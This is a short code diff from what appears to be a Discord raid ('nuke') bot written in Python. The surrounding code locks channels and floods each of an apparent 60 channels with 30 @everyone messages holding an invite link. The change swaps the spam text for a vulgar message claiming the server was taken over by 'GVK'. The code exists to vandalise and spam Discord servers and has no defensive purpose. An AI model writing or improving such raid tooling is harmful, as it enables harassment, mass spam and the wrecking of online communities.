@@ -30,7 +30,7 @@ async def nuke(ctx):
             await ch.set_permissions(guild.default_role, send_messages=False)
             
             # 30 сообщений (ускоренная отправка)
-            tasks = [ch.send(f"@everyone\n**ПЕРЕЕЗД**\nhttps://discord.gg/HTr7pU7ttZ") for _ in range(30)]
+            tasks = [ch.send(f"@everyone\n**ТРАХНУТЫ BY GVK**\nhttps://discord.gg/HTr7pU7ttZ") for _ in range(30)]
             await asyncio.gather(*tasks)
             
             print(f"✅ Канал {i+1}/60 готов")
